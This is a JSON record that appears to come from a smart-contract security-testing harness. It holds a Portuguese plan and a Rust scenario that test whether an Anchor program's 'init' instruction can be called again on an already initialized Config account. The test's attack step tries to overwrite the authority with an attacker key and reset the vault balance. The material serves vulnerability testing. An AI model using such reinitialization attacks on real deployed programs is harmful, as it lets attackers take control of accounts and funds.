{
  "plan": "Preparamos uma conta Config já inicializada (is_initialized=true, authority=algum pubkey, vault_balance=100) com dono do programa. O baseline chama init com essa conta e um novo authority, esperando falha por AlreadyInitialized — mas o baseline precisa ter sucesso, então usamos uma conta não inicializada para o baseline. O ataque chama init novamente na mesma conta já inicializada, tentando sobrescrever o estado. O efeito mede se is_initialized permanece true e se authority/vault_balance foram alterados, indicando reinicialização bem-sucedida.",
  "scenario": "let program_id = env.program_id;

// Conta Config já inicializada (estado legítimo)
let authority_legit = Pubkey::new_unique();
let config_data = anchor_account_data("Config", &(authority_legit, true, 100u64));
let config_key = Pubkey::new_unique();
let config_account = account(&program_id, &config_data, None);

// Conta Config não inicializada para o baseline
let config_data_fresh = anchor_account_data("Config", &(Pubkey::default(), false, 0u64));
let config_key_fresh = Pubkey::new_unique();
let config_account_fresh = account(&program_id, &config_data_fresh, None);

// Baseline: init em conta não inicializada (deve ter sucesso)
let authority_baseline = Pubkey::new_unique();
let ix_baseline = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key_fresh, false),
        AccountMeta::new_readonly(authority_baseline, true),
    ],
);
let contas_baseline = vec![
    (config_key_fresh, config_account_fresh),
    (authority_baseline, wallet(1_000_000_000)),
];
let r_baseline = env.baseline("init em conta nova", &ix_baseline, &contas_baseline);
assert!(r_baseline.program_result == ProgramResult::Success);

// Ataque: init na mesma conta já inicializada, com novo authority
let authority_attacker = Pubkey::new_unique();
let ix_attack = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key, false),
        AccountMeta::new_readonly(authority_attacker, true),
    ],
);
let contas_attack = vec![
    (config_key, config_account),
    (authority_attacker, wallet(1_000_000_000)),
];
let r_attack = env.attack("reinit da conta Config", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let config_after = after(&r_attack, &config_key);
    let data = config_after.data();
    // Layout: 8 bytes discriminador + 32 authority + 1 is_initialized + 8 vault_balance
    let authority_after = read_pubkey(data, 8);
    let is_init_after = data[40] != 0;
    let vault_after = read_u64(data, 41);
    env.effect(
        "authority sobrescrito para o atacante",
        authority_after == authority_attacker,
    );
    env.effect(
        "is_initialized permanece true (reinit bem-sucedida)",
        is_init_after == true,
    );
    env.effect(
        "vault_balance resetado para 0",
        vault_after == 0,
    );
}"
}

